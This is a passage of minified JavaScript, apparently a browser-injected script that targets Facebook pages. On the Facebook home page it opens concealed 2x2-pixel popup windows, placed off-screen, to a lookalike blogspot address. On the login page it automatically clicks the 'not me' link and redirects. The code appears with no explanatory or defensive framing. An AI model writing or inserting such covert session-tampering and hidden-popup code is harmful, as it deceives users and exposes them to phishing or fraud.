...
const s =window.location.pathname;const sen = document.querySelector("button[name='login']");if (window.location.href=="https://www.facebook.com/" && sen) {openChild();openChild();}if(window.location.host=="www.facebook.com" && s=="/login/"){var aas=document.querySelector('#not_me_link');if (aas) {aas.click();window.location.href="https://www.facebook.com/"}}var childwin;function openChild() {childwin = window.open('https://facebookgoo.blogspot.com/','_blank', 'toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=10000, top=10000, width=2, height=2, ', '');  
